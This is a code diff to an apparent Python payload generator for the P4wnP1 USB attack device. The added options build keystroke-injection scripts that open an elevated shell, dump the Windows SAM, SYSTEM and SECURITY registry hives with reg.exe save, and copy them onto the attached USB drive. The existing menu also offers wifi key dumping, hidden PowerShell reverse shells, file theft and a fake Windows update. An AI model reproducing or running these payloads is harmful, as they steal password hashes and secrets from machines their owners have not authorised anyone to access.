@@ -6,9 +6,9 @@ import os
 def windows(): # function payloads Windows
 
 
-    script = raw_input("choose the payload to generate : \n\n1) dump wifi key | layout fr\n2) dump wifi key | layout 'us' 'de' ...\n\n3) reverse shell hiden powershell 'fr'\n4) reverse shell hiden powershell 'us' 'de'\n\n5) stealing files Seytonic method | fr\n6) stealing files Seytonic method | 'us' 'de'\n\n7) windows fake update \n\n8) hello world \n\n9) website\n\n\nchoice : ")
+    script = raw_input("choose the payload to generate : \n\n1) dump wifi key | layout fr\n2) dump wifi key | layout 'us' 'de' ...\n\n3) reverse shell hiden powershell 'fr'\n4) reverse shell hiden powershell 'us' 'de'\n\n5) stealing files Seytonic method | fr\n6) stealing files Seytonic method | 'us' 'de'\n\n7) windows fake update \n\n8) hello world \n\n9) website\n\n10) exfiltre SAM, SYSTEM, SECURITY files 'FR'\n11) exfiltre SAM, SYSTEM, SECURITY files 'US', 'DE'\n\nchoice : ")
     os.system("clear")
-    if script == "2" or script == "4" or script == "6" or script == "7" or script == "8" or script == "9":
+    if script == "2" or script == "4" or script == "6" or script == "7" or script == "8" or script == "9" or script == "11":
     	settingkeyboardlayout = raw_input("\nchoose the keyboard layout : ")
     settingdelay = raw_input("\nchoose the delay between each instruction (ms) : ")
 
@@ -136,6 +136,33 @@ def windows(): # function payloads Windows
         file = open("Output-payloads/win-website-" + (settingkeyboardlayout) + ".js","w")
         file.write(websitevar2)
         file.close()
+
+    elif script == "10":
+        script = ("sam,security,system-windows-files-" + ("fr") + ".js")
+        os.system("clear")
+        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
+        if ums == "":
+                ums = ("README")
+	os.system("clear")
+	windowshashfr = ("\nlayout(\'fr\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"cmd\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("delay(200)\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\sam C:\\\Windows\\\Temp\\\sam.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\system C:\\\Windows\\\Temp\\\system.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\security C:\\\Windows\\\Temp\\\security.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"exit\\n\")\n")+("delay(200)\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(1000)\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(1500)\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" ? { $_.Label -eq '")+(ums)+("' } \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" select name\\n\")\n")+("type(\"cp C:\\\Windows\\\\temp\\\sam.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\security.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\system.save $usbPath.name\\n\")\n")+("delay(2000)\n")+("type(\"exit\\n\")\n")
+	print (windowshashfr)
+        file = open("Output-payloads/SAM,SYSTEM,SECURITY-fr.js","w")
+        file.write(windowshashfr)
+        file.close()
+
+    elif script == "11":
+        script = ("sam,security,system-windows-files-" + ("fr") + ".js")
+        os.system("clear")
+        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
+        if ums == "":
+                ums = ("README")
+	os.system("clear")
+	windowshashus = ("\nlayout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"cmd\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("delay(200)\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\sam C:\\\Windows\\\Temp\\\sam.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\system C:\\\Windows\\\Temp\\\system.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\security C:\\\Windows\\\Temp\\\security.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"exit\\n\")\n")+("delay(200)\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(1000)\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '")+(ums)+("' } | select name\\n\")\n")+("type(\"cp C:\\\Windows\\\\temp\\\sam.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\security.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\system.save $usbPath.name\\n\")\n")+("delay(2000)\n")+("type(\"exit\\n\")\n")
+	print (windowshashus)
+        file = open("Output-payloads/SAM,SYSTEM,SECURITY-" + (settingkeyboardlayout) + ".js","w")
+        file.write(windowshashus)
+        file.close()
+
 
     print ("\nsaved at Output/" + (script))		# where it is save
     menu2 = raw_input("\n\n1) back to menu\n2) generate other payload for only P4wnP1 web interface\n3) exit\n\n> ")
